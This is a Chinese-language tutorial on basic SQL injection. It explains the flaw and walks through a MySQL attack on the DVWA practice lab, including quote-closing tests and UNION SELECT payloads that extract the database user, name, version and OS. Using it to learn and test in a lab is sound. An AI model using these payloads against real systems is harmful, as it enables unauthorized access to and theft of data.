# sql注入基础

- ### 漏洞原理

  对用户输入的数据没有做参数校验，sql语句没有做安全处理，导致用户可以通过参数控制sql语句从而查询一些敏感数据，甚至控制对方主机

- ### 漏洞利用

  前置知识

  ​    1、首先不同的数据库，漏洞注入的方式也不同，例如access数据库，属于独立存在的                   数据库，同时需要对其列名和表名进行猜解决，需要利用字典爆破或者偏移注入等手段

  ​    2、这里以mysql数据库举例，因为市场上mysql用到的比较多并且免费,mysql数据库 属于统一管理，不同网站之间有各种数据库，但都由mysql管理，所以mysql有数据库用户去管理，最高权限用户root

  ​    3、mysql5.0以上版本自带数据库名information_schema查询

  ​	information_schema可以查询数据库名，表名以及列名等信息

   利用流程：

  ​    0、判断注入类型，构造合适的sql语句

  ​	1、获取数据库版本-看是否符合information_schema查询 -version()

  ​	2、数据库用户是否为root权限-user() 

  ​    3、当前操作系统是否支持大小写以及文件读写-@@version_compile_os

  ​    4、数据库名称 database()

  ​	5、构造语句进行攻击

- ### 漏洞复现

  靶场DVWA windows11 phpstudy low级别

  ![image-20231128190231751](http://111.229.225.13:81/i/2023/11/28/vgmfy2-2.png)

  

构造语句1 and 1 = 1 #以及 1 and 1 = 2#页面均正常回显，因此判断不为数字型注入

1' and 1=1#有回显，1' and 1=2#无回显，判断为字符型注入并且闭合形式为单引号

![image-20231128190508809](http://111.229.225.13:81/i/2023/11/28/vi8brd-2.png)

其实可以理解为用户输入导致后端执行了非法的sql语句

```sql
select '1' 
select '1 and 1 = 1 #' 
select '1' and 1 = 2 #' 
select '1' and 1 = 1 #' 
select '1' and 1 = 2 #' 
```

掌握闭合条件，就可以构造自己想输入的sql语句

```sql

1' union select user(),database() from information_schema.schemata #
1' union select @@version_compile_os,version() from information_schema.schemata #

```

![image-20231128191110605](http://111.229.225.13:81/i/2023/11/28/vlthwf-2.png)

![image-20231128191210353](http://111.229.225.13:81/i/2023/11/28/vmeshr-2.png)

​    

同样可以理解为,后端执行下面的sql语句

```sql
select '1' union select user(),database() from information_schema.schemata #
select '1' union select @@version_compile_os,version() from information_schema.schemata #
```

### mysql基础

```sql
select [distinct] 字段名 [as 别名] from 表名 where 查询条件 [group by 分组字段 having 分组后的 查询条件] [order by 排序字段 desc/asc] [limit 分页参数]
```

```sql
union 可以合并两个及以上select语句查询的结果集
```



这里推荐一位博客[SQL注入漏洞全面总结_永不落的梦想的博客-CSDN博客](https://blog.csdn.net/m0_73185293/article/details/131754058?spm=1001.2014.3001.5501)

